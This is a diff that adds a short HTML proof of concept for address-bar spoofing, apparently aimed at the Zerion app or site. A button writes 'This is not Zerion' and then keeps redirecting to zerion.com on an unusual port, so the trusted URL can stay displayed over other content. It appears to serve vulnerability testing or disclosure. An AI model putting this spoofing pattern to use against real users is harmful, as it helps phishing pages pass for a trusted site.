@@ -1,0 +1,17 @@
+<html>
+<head>
+  <title>Spoofer Proof of Concept</title>
+</head>
+<body>
+<script>  
+  function spoof() { 
+  document.write("<h1>This is not Zerion</h1>");  
+  document.location = "https://zerion.com:1234"; 
+    setInterval(function(){document.location="https://zerion.com:1234";},9800); 
+  }; 
+</script> 
+
+<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case"  onclick="spoof();" /> </p>
+
+</body>
+</html>
